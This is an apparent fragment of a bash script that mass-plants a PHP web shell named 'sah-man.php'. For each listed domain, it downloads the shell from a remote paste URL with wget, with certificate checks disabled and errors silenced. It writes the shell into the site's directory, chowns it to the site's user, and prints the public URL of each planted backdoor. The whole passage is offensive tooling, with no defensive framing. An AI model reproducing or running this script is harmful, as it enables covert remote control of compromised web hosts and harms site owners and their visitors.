SHELL_URL="https://rusdi.fun/raw/d4cbbab"
SHELL_NAME="sah-man.php"

  [[ -z "$domain" || "$domain" == \#* ]] && continue
  wget -q --no-check-certificate -O "${path}/${SHELL_NAME}" "$SHELL_URL" 2>/dev/null
  if [ $? -eq 0 ]; then
    user=$(echo "$path" | cut -d'/' -f3)
    chown "${user}:${user}" "${path}/${SHELL_NAME}" 2>/dev/null
    echo "[+] https://${domain}/${SHELL_NAME}"
  else
    echo "[-] FAILED: $domain"
  fi
done << 'DOMAINS'
